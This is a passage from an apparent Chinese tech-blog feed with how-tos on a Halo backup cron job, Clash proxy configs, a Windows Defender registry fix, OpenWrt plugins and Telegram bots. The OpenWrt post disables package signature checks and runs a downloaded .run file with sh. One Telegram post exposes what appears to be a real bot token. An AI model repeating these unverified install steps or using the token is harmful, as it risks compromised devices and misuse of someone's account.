<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"> BK_DR=/data/backup    <span class="comment">#备份文件存放路径</span></span><br><span class="line"> DB_DR=/root/.halo</span><br><span class="line"> DAYS=30                    <span class="comment">#DAYS=30代表删除30天前的备份，即只保留最近30天的备份</span></span><br><span class="line"> LINUX_USER=root           <span class="comment">#系统用户名</span></span><br><span class="line"> <span class="built_in">date</span>=` <span class="built_in">date</span> +%Y%m%d `</span><br><span class="line"> tar zcvf <span class="variable">$BK_DR</span>/halo<span class="variable">$date</span>.tar.gz <span class="variable">$DB_DR</span></span><br><span class="line"> <span class="built_in">chown</span> -R <span class="variable">$LINUX_USER</span>:<span class="variable">$LINUX_USER</span> <span class="variable">$BK_DR</span>  <span class="comment">#更改备份数据库文件的所有者</span></span><br><span class="line"> find <span class="variable">$BK_DR</span> -name <span class="string">&quot;halo*&quot;</span> -<span class="built_in">type</span> f -mtime +<span class="variable">$DAYS</span> -<span class="built_in">exec</span> <span class="built_in">rm</span> &#123;&#125; \;  <span class="comment">#删除30天前的备份文件(注意：&#123;&#125; \;中间有空格)</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">#保存退出</span></span><br><span class="line">:wq</span><br></pre></td></tr></table></figure>
<h1 id="3、修改文件属性，使其可执行"><a href="#3、修改文件属性，使其可执行" class="headerlink" title="3、修改文件属性，使其可执行"></a>3、修改文件属性，使其可执行</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">chmod</span> +x /data/halobackup.sh</span><br></pre></td></tr></table></figure>
<h1 id="4、修改-etc-crontab"><a href="#4、修改-etc-crontab" class="headerlink" title="4、修改&#x2F;etc&#x2F;crontab"></a>4、修改&#x2F;etc&#x2F;crontab</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vi /etc/crontab</span><br><span class="line"><span class="comment">#进入编辑</span></span><br><span class="line">i </span><br><span class="line"><span class="comment">#在最下面添加， 表示每天凌晨1点40分执行备份  </span></span><br><span class="line">40 1 * * * /data/halobackup.sh</span><br><span class="line"></span><br><span class="line"><span class="comment">#保存退出</span></span><br><span class="line">:wq</span><br></pre></td></tr></table></figure>
<h1 id="5、重新启动crond使设置生效"><a href="#5、重新启动crond使设置生效" class="headerlink" title="5、重新启动crond使设置生效"></a>5、重新启动crond使设置生效</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#重启服务</span></span><br><span class="line">/bin/systemctl restart crond.service </span><br><span class="line"><span class="comment">#设为开机启动</span></span><br><span class="line">systemctl <span class="built_in">enable</span> crond.service </span><br><span class="line"><span class="comment">#启动服务</span></span><br><span class="line">/bin/systemctl start crond.service </span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>web</category>
        <category>halo</category>
      </categories>
      <tags>
        <tag>web</tag>
        <tag>halo</tag>
      </tags>
  </entry>
  <entry>
    <title>clash 配置解决dns泄漏问题</title>
    <url>/posts/a5d506b7/</url>
    <content><![CDATA[<p>查询dns泄漏：<a href="https://ipleak.net/">https://ipleak.net</a></p>
<p><a href="https://ipcheck.ing/#/">IPCheck.ing - 查看我的 IP 地址 - 查询本机 IP 地址及归属地 - 查看 WebRTC 连接 IP - DNS 泄露检测 - 网速测试 - Jason Ng 阿禅开源作品</a></p>
<p>clash远程配置文件：<a href="https://cf.buliang0.cf/clash-rules/nodnsleak.ini">https://cf.buliang0.cf/clash-rules/nodnsleak.ini</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[custom]</span><br><span class="line">;解决DNS泄露，无分流群组</span><br><span class="line">ruleset=🚀 节点选择,[]DOMAIN-SUFFIX,xn--ngstr-lra8j.com</span><br><span class="line">ruleset=🚀 节点选择,[]DOMAIN-SUFFIX,services.googleapis.cn</span><br><span class="line">ruleset=🚀 节点选择,https://raw.githubusercontent.com/ACL4SSR/ACL4SSR/master/Clash/Ruleset/GoogleCNProxyIP.list</span><br><span class="line">ruleset=DIRECT,https://raw.githubusercontent.com/ACL4SSR/ACL4SSR/master/Clash/LocalAreaNetwork.list</span><br><span class="line">ruleset=DIRECT,https://raw.githubusercontent.com/ACL4SSR/ACL4SSR/master/Clash/UnBan.list</span><br><span class="line">ruleset=DIRECT,https://raw.githubusercontent.com/ACL4SSR/ACL4SSR/master/Clash/ChinaDomain.list</span><br><span class="line">ruleset=DIRECT,https://raw.githubusercontent.com/ACL4SSR/ACL4SSR/master/Clash/ChinaMedia.list</span><br><span class="line">ruleset=REJECT,https://raw.githubusercontent.com/ACL4SSR/ACL4SSR/master/Clash/BanAD.list</span><br><span class="line">ruleset=REJECT,https://raw.githubusercontent.com/ACL4SSR/ACL4SSR/master/Clash/BanProgramAD.list</span><br><span class="line">ruleset=DIRECT,https://raw.githubusercontent.com/ACL4SSR/ACL4SSR/master/Clash/ChinaCompanyIp.list</span><br><span class="line">ruleset=DIRECT,https://raw.githubusercontent.com/ACL4SSR/ACL4SSR/master/Clash/ChinaIp.list</span><br><span class="line">ruleset=DIRECT,[]GEOIP,CN,no-resolve</span><br><span class="line">ruleset=🚀 节点选择,[]FINAL</span><br><span class="line"></span><br><span class="line">custom_proxy_group=🚀 节点选择`select`[]♻️ 自动选择`[]DIRECT`.*</span><br><span class="line">custom_proxy_group=♻️ 自动选择`url-test`.*`http://www.gstatic.com/generate_204`300,,50</span><br><span class="line"></span><br><span class="line">enable_rule_generator=true</span><br><span class="line">overwrite_original_rules=true</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>proxy</category>
        <category>clash</category>
        <category>hack</category>
        <category>leak</category>
      </categories>
      <tags>
        <tag>proxy</tag>
        <tag>hack</tag>
        <tag>clash</tag>
        <tag>leak</tag>
      </tags>
  </entry>
  <entry>
    <title>图片放大不失真！最好的ai免费图片无损放大软件和网站，图片编辑必备工具</title>
    <url>/posts/656339f8/</url>
    <content><![CDATA[<h1 id="gigapixel-AI-photoshop-2022"><a href="#gigapixel-AI-photoshop-2022" class="headerlink" title="gigapixel AI &amp; photoshop 2022"></a>gigapixel AI &amp; photoshop 2022</h1><p>下载链接 <a href="https://www.youtube.com/redirect?event=video_description&redir_token=QUFFLUhqbVlHVXlpeFMxcW11R3QySy1idDZEWjhBdDdHUXxBQ3Jtc0tuZW5ObzJmSWVQbnY0emlReUtVblpoOHFiRjlITUV4YjA2Q0h1aXdaZHhEbTlZcDc2bF82YVBOOVVzTUNlSVZCNmw1eDlPU1R0NHozX1RjWU5hOFZsdS1DQVVDbXQ3aVFXRW1MNU5GVF9Ga2lMYUJDbw&q=https://www.aliyundrive.com/s/FvDVvspnGpp&v=1iQXK6wsuJM">https://www.youtube.com/redirect?event=video_description&amp;redir_token=QUFFLUhqbVlHVXlpeFMxcW11R3QySy1idDZEWjhBdDdHUXxBQ3Jtc0tuZW5ObzJmSWVQbnY0emlReUtVblpoOHFiRjlITUV4YjA2Q0h1aXdaZHhEbTlZcDc2bF82YVBOOVVzTUNlSVZCNmw1eDlPU1R0NHozX1RjWU5hOFZsdS1DQVVDbXQ3aVFXRW1MNU5GVF9Ga2lMYUJDbw&amp;q=https%3A%2F%2Fwww.aliyundrive.com%2Fs%2FFvDVvspnGpp&amp;v=1iQXK6wsuJM</a></p>
<h1 id="waifu2x"><a href="#waifu2x" class="headerlink" title="waifu2x"></a>waifu2x</h1><p>下载链接 <a href="https://www.youtube.com/redirect?event=video_description&redir_token=QUFFLUhqbUhaNXgwcktvOXc4XzJtTGpKTjZkdUNEdjNtd3xBQ3Jtc0tscE9kTmIweGdaQlNaa0hGWGsxcUtrbVJIZEtTY1JqZnE3eHBvdWxHd2pwWWVYTl9zZFBodmhueWR2QlJDeGpRV2t1dHV4dUV3UzJpRTRVMUZxd3dPNDNLYUJ6TGxUQ3VDQlpBSEJzSWdudE9nM2w5OA&q=https://github.com/AaronFeng753/Waifu2x-Extension-GUI&v=1iQXK6wsuJM">https://www.youtube.com/redirect?event=video_description&amp;redir_token=QUFFLUhqbUhaNXgwcktvOXc4XzJtTGpKTjZkdUNEdjNtd3xBQ3Jtc0tscE9kTmIweGdaQlNaa0hGWGsxcUtrbVJIZEtTY1JqZnE3eHBvdWxHd2pwWWVYTl9zZFBodmhueWR2QlJDeGpRV2t1dHV4dUV3UzJpRTRVMUZxd3dPNDNLYUJ6TGxUQ3VDQlpBSEJzSWdudE9nM2w5OA&amp;q=https%3A%2F%2Fgithub.com%2FAaronFeng753%2FWaifu2x-Extension-GUI&amp;v=1iQXK6wsuJM</a></p>
<h1 id="imgupscaler"><a href="#imgupscaler" class="headerlink" title="imgupscaler"></a>imgupscaler</h1><p><a href="https://imgupscaler.com/">https://imgupscaler.com/</a></p>
<h1 id="zyro"><a href="#zyro" class="headerlink" title="zyro"></a>zyro</h1><p><a href="https://zyro.com/tools/image-upscaler">https://zyro.com/tools/image-upscaler</a></p>
<h1 id="佐糖"><a href="#佐糖" class="headerlink" title="佐糖"></a>佐糖</h1><p><a href="https://picwish.cn/">https://picwish.cn/</a></p>
]]></content>
      <categories>
        <category>ai</category>
      </categories>
      <tags>
        <tag>ai</tag>
      </tags>
  </entry>
  <entry>
    <title>关于windows10安全中心空白解决办法（显示无提供程序）</title>
    <url>/posts/ad145bf0/</url>
    <content><![CDATA[<p>修复方法：复制以下内容</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Windows Registry Editor Version 5.00</span><br><span class="line"></span><br><span class="line">[HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender]</span><br><span class="line"></span><br><span class="line">“DisableAntiSpyware”=dword:00000000</span><br><span class="line"></span><br><span class="line">[HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection]</span><br><span class="line"></span><br><span class="line">“DisableBehaviorMonitoring”=dword:00000000</span><br><span class="line"></span><br><span class="line">“DisableIOAVProtection”=dword:00000000</span><br><span class="line"></span><br><span class="line">“DisableOnAccessProtection”=dword:00000000</span><br><span class="line"></span><br><span class="line">“DisableRealtimeMonitoring”=dword:00000000</span><br><span class="line"></span><br><span class="line">[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\SecurityHealthService]</span><br><span class="line"></span><br><span class="line">“Start”=dword:00000002</span><br></pre></td></tr></table></figure>
<p>粘贴保存至记事本，然后将记事本文件的后缀txt改为reg(r不显示后缀的话可以将隐藏的项目打对勾)<br>程序以打包在此：<a href="https://wwsf.lanzouw.com/i2Mts0uox9sf">https://wwsf.lanzouw.com/i2Mts0uox9sf</a><br>密码:9o6i<br>双击运行导入注册表（导入前一定要卸载干净第三方杀毒软件），导入成功后重启电脑，这时候安全中心便恢复正常了。<br>也就是将注册表中的：“HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\SecurityHealthService”，然后双击右边的“start”把值由8 (或者4)改为2</p>
]]></content>
      <categories>
        <category>os</category>
        <category>windows</category>
      </categories>
      <tags>
        <tag>os</tag>
        <tag>windows</tag>
      </tags>
  </entry>
  <entry>
    <title>openwrt固件和安装插件（软路由x86/arm）</title>
    <url>/posts/f715f48/</url>
    <content><![CDATA[<h1 id="固件下载地址："><a href="#固件下载地址：" class="headerlink" title="固件下载地址："></a>固件下载地址：</h1><p><a href="https://dl.openwrt.ai/">https://dl.openwrt.ai/</a></p>
<p>斐讯N1用的OpenWrt固件</p>
<p><a href="https://supes.top/?version=22.03&target=armvirt/64&id=box">https://supes.top/?version=22.03&amp;target=armvirt%2F64&amp;id=box</a></p>
<p>KoolCenter固件列表（iStoreOS，Lean，KoolCenter，LEDE等）</p>
<p><a href="https://fw.koolcenter.com/">https://fw.koolcenter.com/</a></p>
<h1 id="openwrt第三方固件的插件安装方法一（推荐）："><a href="#openwrt第三方固件的插件安装方法一（推荐）：" class="headerlink" title="openwrt第三方固件的插件安装方法一（推荐）："></a>openwrt第三方固件的插件安装方法一（推荐）：</h1><p>iStore插件包（适合 aarch64_cortex-a53 和 x86_64 平台)，包括：PassWall，PassWall2，SSR-Plus，OpenClash等插件</p>
<p><a href="https://github.com/wukongdaily/RunFilesBuilder/releases">https://github.com/wukongdaily/RunFilesBuilder/releases</a></p>
<p><a href="https://github.com/macinko/Are-u-ok?tab=readme-ov-file">https://github.com/macinko/Are-u-ok?tab=readme-ov-file</a></p>
<p>下载后，来到iStore应用商店页面，点击手动安装，点击选择上传或者直接拖放文件</p>
<p>对于没有iStore应用商店的Immortalwrt 等其他OpenWrt也可以使用以下方法。</p>
<p>将 .run 文件上传到路由器上，然后在终端环境执行</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#下载run包</span></span><br><span class="line">wget -O xxx.run &lt;run下载地址&gt;</span><br><span class="line"><span class="comment">#安装run包</span></span><br><span class="line">sh xxx.run</span><br></pre></td></tr></table></figure>

<h1 id="openwrt原版固件的插件安装方法二："><a href="#openwrt原版固件的插件安装方法二：" class="headerlink" title="openwrt原版固件的插件安装方法二："></a>openwrt原版固件的插件安装方法二：</h1><p>1.系统——软件包——配置OPKG</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/etc/opkg.conf</span><br></pre></td></tr></table></figure>

<p>2.注释掉检查签名 #option check_signature</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/etc/opkg/customfeeds.conf</span><br></pre></td></tr></table></figure>

<p>3.添加软件源地址，如x86的：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">src/gz dllkids https://op.dllkids.xyz/packages/x86_64/</span><br></pre></td></tr></table></figure>

<p>4.保存——更新列表——搜索插件名称安装——勾选覆盖其他文件包中的文件——安装——刷新一下，在服务就会出现插件</p>
]]></content>
      <categories>
        <category>os</category>
        <category>openwrt</category>
      </categories>
      <tags>
        <tag>os</tag>
        <tag>openwrt</tag>
      </tags>
  </entry>
  <entry>
    <title>查代理ip，查真实ip，查dns泄漏，查webrtc，测速</title>
    <url>/posts/3d012be0/</url>
    <content><![CDATA[<h1 id="查代理ip"><a href="#查代理ip" class="headerlink" title="查代理ip"></a>查代理ip</h1><p><a href="http://ping.pe/">http://ping.pe/</a></p>
<p><a href="https://whoer.net/zh">https://whoer.net/zh</a></p>
<p><a href="http://ip111.cn/">http://ip111.cn/</a></p>
<p><a href="https://ip.skk.moe/">https://ip.skk.moe/</a></p>
<p><a href="https://ping.chinaz.com/">https://ping.chinaz.com/</a></p>
<h1 id="查真实ip"><a href="#查真实ip" class="headerlink" title="查真实ip"></a>查真实ip</h1><p><a href="https://www.ipip.net/">https://www.ipip.net/</a></p>
<p><a href="http://www.net.cn/static/customercare/yourip.asp">http://www.net.cn/static/customercare/yourip.asp</a></p>
<p><a href="http://myip.ipip.net/">http://myip.ipip.net/</a></p>
<p><a href="https://www.myip.la/">https://www.myip.la/</a></p>
<h1 id="查dns泄漏"><a href="#查dns泄漏" class="headerlink" title="查dns泄漏"></a>查dns泄漏</h1><p><a href="https://ipleak.net/">https://ipleak.net</a></p>
<p><a href="https://ipcheck.ing/#/">IPCheck.ing - 查看我的 IP 地址 - 查询本机 IP 地址及归属地 - 查看 WebRTC 连接 IP - DNS 泄露检测 - 网速测试 - Jason Ng 阿禅开源作品</a></p>
<h1 id="查WebRTC"><a href="#查WebRTC" class="headerlink" title="查WebRTC"></a>查WebRTC</h1><p><a href="https://ip.voidsec.com/">https://ip.voidsec.com/</a></p>
<p><a href="https://browserleaks.com/webrtc">https://browserleaks.com/webrtc</a></p>
<h1 id="测速"><a href="#测速" class="headerlink" title="测速"></a>测速</h1><p><a href="https://fast.com/">https://fast.com/</a></p>
]]></content>
      <categories>
        <category>hack</category>
        <category>leak</category>
      </categories>
      <tags>
        <tag>hack</tag>
        <tag>leak</tag>
      </tags>
  </entry>
  <entry>
    <title>telegram 创建 bot，获取chat_id发消息</title>
    <url>/posts/6a7a32c5/</url>
    <content><![CDATA[<h1 id="创建bot"><a href="#创建bot" class="headerlink" title="创建bot"></a>创建bot</h1><p>首先我们要找到bot father <a href="https://t.me/BotFather">https://t.me/BotFather</a></p>
<p>然后输入指令 &#x2F;newbot 创建一个bot</p>
<p>接下来输入bot 的昵称和bot的 @username 即可创建一个bot</p>
<p>此时会获得一个token，保存起来</p>
<h1 id="然后start-bot"><a href="#然后start-bot" class="headerlink" title="然后start bot"></a>然后start bot</h1><p>获取chat_id<br>访问 </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://api.telegram.org/bot&#123;Bot的API&#125;/getUpdates</span><br></pre></td></tr></table></figure>
<p>不用加空格，然后浏览器 ”ctrl+f “搜索 “chat”</p>
<p>示例：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://api.telegram.org/botgslhjgfd:45g645gs-fgs/getUpdates</span><br></pre></td></tr></table></figure>

<h1 id="如果-getUpdates-不刷新，则可以通过访问下面的URL获取最新的消息"><a href="#如果-getUpdates-不刷新，则可以通过访问下面的URL获取最新的消息" class="headerlink" title="如果 getUpdates 不刷新，则可以通过访问下面的URL获取最新的消息"></a>如果 getUpdates 不刷新，则可以通过访问下面的URL获取最新的消息</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://api.telegram.org/bot&#123;Bot的API&#125;/getUpdates?offset=-1</span><br></pre></td></tr></table></figure>
<p>chat 后面跟着的id “id”:123456789就是chatid了,“</p>
<p>然后就可以用bot向自己发消息了</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://api.telegram.org/bot&#123;Bot的API&#125;/sendMessage?chat_id=123456789&amp;text=1234</span><br></pre></td></tr></table></figure>

<p>使用方法<br>有些github项目可以通过bot_api来实现发消息</p>
]]></content>
      <categories>
        <category>tools</category>
        <category>telegram</category>
      </categories>
      <tags>
        <tag>tools</tag>
        <tag>telegram</tag>
      </tags>
  </entry>
  <entry>
    <title>telegram机器人bot向电报群内自动定时发送消息或图片</title>
    <url>/posts/fdf95ed6/</url>
    <content><![CDATA[<h1 id="第一步，创建一个Telegram-Bot机器人并获取Token代码"><a href="#第一步，创建一个Telegram-Bot机器人并获取Token代码" class="headerlink" title="第一步，创建一个Telegram Bot机器人并获取Token代码"></a>第一步，创建一个Telegram Bot机器人并获取Token代码</h1><p>在Telegram内【@BotFather】添加机器人之父，在对话框内【Menu】菜单Create a new bot创建一个机器人，随后为这个Bot创建名称，可以是中文，之后创建Username用户名，完成后会收到这个Bot的HTTP API Token代码，如下这样：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Use this token to access the HTTP API:</span><br><span class="line">1973306889:AAF-KwD5RYbtDFR52FHk-N4HAZxW_bUHk1rk</span><br><span class="line">Keep your token secure and store it safely, it can be used by anyone to control your bot.</span><br></pre></td></tr></table></figure>
<p>然后把这个Bot拉入群组内并设为管理员。</p>
<h1 id="第二步，获取群组Chat-ID号"><a href="#第二步，获取群组Chat-ID号" class="headerlink" title="第二步，获取群组Chat ID号"></a>第二步，获取群组Chat ID号</h1><p>在Telegram内【@Telegram Bot Raw 】，跟它对话，添加为联系人，然后拉入群组。当它进群后会自动发出一堆代码，找到其中如下部分内容，id后边就是这个群组的Chat ID，之后把它踢出去。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">“chat”: &#123;</span><br><span class="line">“id”: -591256428,</span><br><span class="line">“title”: “\u6d4b\u8bd52”,</span><br><span class="line">“type”: “group”,</span><br></pre></td></tr></table></figure>
<h1 id="第三步，创建发送链接代码"><a href="#第三步，创建发送链接代码" class="headerlink" title="第三步，创建发送链接代码"></a>第三步，创建发送链接代码</h1><p>发送纯文字：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://api.telegram.org/bot这里填Bot的Token代码/sendMessage?chat_id=这里填群组Chat ID号码&amp;text=这里填消息内容</span><br></pre></td></tr></table></figure>
<p>发送图片：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://api.telegram.org/bot这里填Bot的Token代码/sendPhoto?chat_id=这里填群组Chat ID号码&amp;photo=这里填图片URL地址</span><br></pre></td></tr></table></figure>
<p>更多详细设置可参考官网技术说明： <a href="https://core.telegram.org/bots/api#available-methods">https://core.telegram.org/bots/api#available-methods</a><br>之后把以上https链接在可访问Telegram的浏览器中打开测试，浏览器会反馈测试结果，如果看不懂的话就直接去Telegram观察Bot是否发送成功。</p>
<h1 id="第四步，设置自动定时任务"><a href="#第四步，设置自动定时任务" class="headerlink" title="第四步，设置自动定时任务"></a>第四步，设置自动定时任务</h1><p>选购一台国外线路的VPS服务器并安装宝塔面板<br>在宝塔面板的【计划任务】中创建任务类型为”访问URL”的计划任务，按自己需要设定相应的自动执行时间，把上边的http链接复制到这里即可<br>这样就实现了让Bot机器人在指定的时间内自动向电报群组内发送消息或图片了</p>
]]></content>
      <categories>
        <category>tools</category>
        <category>telegram</category>
      </categories>
      <tags>
        <tag>tools</tag>
        <tag>telegram</tag>
      </tags>
  </entry>
  <entry>
    <title>clash 规则配置文档</title>
    <url>/posts/b73ae861/</url>
    <content><![CDATA[<p>该规则配置文件的主要分流规则来自于大佬们的GitHub库：blackmatrix7、anti-AD、ACL4SSR</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="attr">port:</span> <span class="number">8888</span></span><br><span class="line"><span class="attr">socks-port:</span> <span class="number">8889</span></span><br><span class="line"><span class="attr">mixed-port:</span> <span class="number">8899</span></span><br><span class="line"><span class="attr">allow-lan:</span> <span class="literal">true</span></span><br><span class="line"><span class="attr">mode:</span> <span class="string">Rule</span></span><br><span class="line"><span class="attr">log-level:</span> <span class="string">info</span></span><br><span class="line"><span class="attr">external-controller:</span> <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span><span class="string">:6170</span></span><br><span class="line"><span class="attr">experimental:</span></span><br><span class="line">  <span class="attr">ignore-resolve-fail:</span> <span class="literal">true</span></span><br><span class="line"><span class="attr">cfw-latency-timeout:</span> <span class="number">3000</span></span><br><span class="line"><span class="attr">cfw-latency-url:</span> <span class="string">http://cp.cloudflare.com/generate_204</span></span><br><span class="line"><span class="attr">cfw-conn-break-strategy:</span> <span class="literal">true</span></span><br><span class="line"><span class="attr">clash-for-android:</span></span><br><span class="line">  <span class="attr">ui-subtitle-pattern:</span> <span class="string">&#x27;[一-龥]&#123;2,4&#125;&#x27;</span></span><br><span class="line"><span class="attr">url-rewrite:</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">^https?:\/\/(www.)?(g|google)\.cn</span> <span class="string">https://www.google.com</span> <span class="number">302</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">^https?:\/\/(ditu|maps).google\.cn</span> <span class="string">https://maps.google.com</span> <span class="number">302</span></span><br><span class="line"></span><br><span class="line"><span class="attr">dns:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">ipv6:</span> <span class="literal">false</span></span><br><span class="line">  <span class="attr">listen:</span> <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span><span class="string">:53</span></span><br><span class="line">  <span class="attr">enhanced-mode:</span> <span class="string">redir-host</span></span><br><span class="line">  <span class="attr">fake-ip-range:</span> <span class="number">198.18</span><span class="number">.0</span><span class="number">.1</span><span class="string">/16</span></span><br><span class="line">  <span class="attr">fake-ip-filter:</span></span><br><span class="line">     <span class="bullet">-</span> <span class="string">&#x27;*.lan&#x27;</span></span><br><span class="line">     <span class="bullet">-</span> <span class="string">localhost.ptlogin2.qq.com</span></span><br><span class="line">  <span class="attr">nameserver:</span></span><br><span class="line">     <span class="bullet">-</span> <span class="number">223.5</span><span class="number">.5</span><span class="number">.5</span></span><br><span class="line">     <span class="bullet">-</span> <span class="number">119.29</span><span class="number">.29</span><span class="number">.29</span></span><br><span class="line">     <span class="bullet">-</span> <span class="string">https://doh.pub/dns-query</span></span><br><span class="line">     <span class="bullet">-</span> <span class="string">https://dns.alidns.com/dns-query</span></span><br><span class="line">  <span class="attr">fallback:</span></span><br><span class="line">     <span class="bullet">-</span> <span class="number">8.8</span><span class="number">.8</span><span class="number">.8</span></span><br><span class="line">     <span class="bullet">-</span> <span class="number">1.1</span><span class="number">.1</span><span class="number">.1</span></span><br><span class="line">     <span class="bullet">-</span> <span class="string">tls://1.0.0.1:853</span></span><br><span class="line">     <span class="bullet">-</span> <span class="string">tls://dns.google:853</span></span><br><span class="line">     <span class="bullet">-</span> <span class="string">https://cloudflare-dns.com/dns-query</span></span><br><span class="line">     <span class="bullet">-</span> <span class="string">https://dns.google/dns-query</span></span><br><span class="line">  <span class="attr">fallback-filter:</span></span><br><span class="line">     <span class="attr">geoip:</span> <span class="literal">true</span></span><br><span class="line">     <span class="attr">ipcidr:</span></span><br><span class="line">       <span class="bullet">-</span> <span class="number">240.0</span><span class="number">.0</span><span class="number">.0</span><span class="string">/4</span>       </span><br><span class="line"><span class="comment"># 1. clash DNS 请求逻辑：</span></span><br><span class="line"><span class="comment">#   (1) 当访问一个域名时， nameserver 与 fallback 列表内的所有服务器并发请求，得到域名对应的 IP 地址。</span></span><br><span class="line"><span class="comment">#   (2) clash 将选取 nameserver 列表内，解析最快的结果。</span></span><br><span class="line"><span class="comment">#   (3) 若解析结果中，IP 地址属于 国外，那么 clash 将选择 fallback 列表内，解析最快的结果。</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#   因此，我在 nameserver 和 fallback 内都放置了无污染、解析速度较快的国内 DNS 服务器，以达到最快的解析速度。</span></span><br><span class="line"><span class="comment">#   但是 fallback 列表内服务器会用在解析境外网站，为了结果绝对无污染，我仅保留了支持 DoT/DoH 的两个服务器。</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># 2. clash DNS 配置注意事项：</span></span><br><span class="line"><span class="comment">#   (1) 如果您为了确保 DNS 解析结果无污染，请仅保留列表内以 tls:// 或 https:// 开头的 DNS 服务器，但是通常对于国内域名没有必要。</span></span><br><span class="line"><span class="comment">#   (2) 如果您不在乎可能解析到污染的结果，更加追求速度。请将 nameserver 列表的服务器插入至 fallback 列表内，并移除重复项。</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># 3. 关于 DNS over HTTPS (DoH) 和 DNS over TLS (DoT) 的选择：</span></span><br><span class="line"><span class="comment">#   对于两项技术双方各执一词，而且会无休止的争论，各有利弊。各位请根据具体需求自行选择，但是配置文件内默认启用 DoT，因为目前国内没有封锁或管制。</span></span><br><span class="line"><span class="comment">#   DoH: 以 https:// 开头的 DNS 服务器。拥有更好的伪装性，且几乎不可能被运营商或网络管理封锁，但查询效率和安全性可能略低。</span></span><br><span class="line"><span class="comment">#   DoT: 以 tls:// 开头的 DNS 服务器。拥有更高的安全性和查询效率，但端口有可能被管制或封锁。</span></span><br><span class="line"><span class="comment">#   若要了解更多关于 DoH/DoT 相关技术，请自行查阅规范文档。</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 代理组</span></span><br><span class="line"><span class="comment"># 下面这2项，大家根据自身情况进行修改。</span></span><br><span class="line"><span class="comment"># Will be ignored after profile selection</span></span><br><span class="line"><span class="comment">#proxies:</span></span><br><span class="line"><span class="comment">#  - name: Shadowsocks</span></span><br><span class="line"><span class="comment">#    type: socks5</span></span><br><span class="line"><span class="comment">#    server: 127.0.0.1</span></span><br><span class="line"><span class="comment">#    port: 1080</span></span><br><span class="line"><span class="comment">#proxy-groups:</span></span><br><span class="line"><span class="comment">#  - name: Proxy</span></span><br><span class="line"><span class="comment">#    type: select</span></span><br><span class="line"><span class="comment">#    proxies:</span></span><br><span class="line"><span class="comment">#      - Shadowsocks</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#以下rules主要着重于网页广告、应用广告、运行商劫持、隐私、国外多媒体等方面。</span></span><br><span class="line"><span class="attr">rules:</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">RULE-SET,Advertising,AdBlock</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">RULE-SET,Advertising_Domain,AdBlock</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">RULE-SET,BanAD,AdBlock</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">RULE-SET,Hijacking,AdBlock</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">RULE-SET,Privacy,AdBlock</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">RULE-SET,Privacy_Domain,AdBlock</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">RULE-SET,AdguardDNS,AdBlock</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">RULE-SET,Special,DIRECT</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">RULE-SET,Netflix,Netflix</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">RULE-SET,Spotify,Spotify</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">RULE-SET,YouTube,YouTube</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">RULE-SET,Disney</span> <span class="string">Plus,Disney</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">RULE-SET,Bilibili,Asian</span> <span class="string">TV</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">RULE-SET,IQ,Asian</span> <span class="string">TV</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">RULE-SET,IQIYI,Asian</span> <span class="string">TV</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">RULE-SET,Letv,Asian</span> <span class="string">TV</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">RULE-SET,Netease</span> <span class="string">Music,Asian</span> <span class="string">TV</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">RULE-SET,Tencent</span> <span class="string">Video,Asian</span> <span class="string">TV</span></span><br><span class="line"><span class="bullet">-</span> 